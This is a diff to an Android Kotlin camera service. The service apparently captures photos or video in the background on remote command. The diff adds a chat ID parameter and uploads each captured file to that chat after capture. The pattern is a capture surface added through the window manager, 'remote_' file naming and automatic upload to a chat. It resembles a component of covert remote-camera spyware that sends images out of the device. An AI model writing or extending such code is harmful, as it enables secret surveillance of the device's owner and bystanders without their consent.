@@ -21,6 +21,7 @@ class CameraService : Service() {
         const val EXTRA_FLASH = "flash"
         const val EXTRA_QUALITY = "quality"
         const val EXTRA_DURATION = "duration"
+        const val EXTRA_CHAT_ID = "chat_id"
 
         fun start(
             context: Context,
@@ -28,7 +29,8 @@ class CameraService : Service() {
             camera: String,
             flash: Boolean,
             quality: Int?,
-            duration: Int?
+            duration: Int?,
+            chatId: String?
         ) {
             val intent = Intent(context, CameraService::class.java).apply {
                 putExtra(EXTRA_TYPE, type)
@@ -36,6 +38,7 @@ class CameraService : Service() {
                 putExtra(EXTRA_FLASH, flash)
                 quality?.let { putExtra(EXTRA_QUALITY, it) }
                 duration?.let { putExtra(EXTRA_DURATION, it) }
+                chatId?.let { putExtra(EXTRA_CHAT_ID, it) }
             }
             context.startForegroundService(intent)
         }
@@ -46,7 +49,8 @@ class CameraService : Service() {
         val camera = intent?.getStringExtra(EXTRA_CAMERA) ?: "rear"
         val flash = intent?.getBooleanExtra(EXTRA_FLASH, false) ?: false
         val quality = intent?.getIntExtra(EXTRA_QUALITY, 720) ?: 720
-        val duration = intent?.getIntExtra(EXTRA_DURATION, if (type == "video") 60 else 0) ?: if (type == "video") 60 else 0
+        val duration = intent?.getIntExtra(EXTRA_DURATION, 60) ?: 60
+        val chatId = intent?.getStringExtra(EXTRA_CHAT_ID)
 
         scope.launch {
             try {
@@ -61,10 +65,7 @@ class CameraService : Service() {
                 withContext(Dispatchers.Main) {
                     winMgr.addView(surfaceView, lp)
                 }
-                val file = File(
-                    getExternalFilesDir(Environment.DIRECTORY_PICTURES),
-                    "remote_${System.currentTimeMillis()}.${if (type == "photo") "jpg" else "mp4"}"
-                )
+                val file = File(getExternalFilesDir(Environment.DIRECTORY_PICTURES), "remote_${System.currentTimeMillis()}.${if (type == "photo") "jpg" else "mp4"}")
                 CameraBackgroundHelper.takePhotoOrVideo(
                     this@CameraService,
                     surfaceView.holder,
@@ -72,13 +73,16 @@ class CameraService : Service() {
                     camera,
                     flash,
                     quality,
-                    if (type == "video") duration else 0,
+                    duration,
                     file
                 )
                 withContext(Dispatchers.Main) {
                     winMgr.removeView(surfaceView)
                 }
                 Log.d("CameraService", "Saved $type to ${file.absolutePath}")
+                if (chatId != null) {
+                    UploadManager.queueUpload(file, chatId, type)
+                }
             } catch (e: Exception) {
                 Log.e("CameraService", "Error: $e")
             } finally {
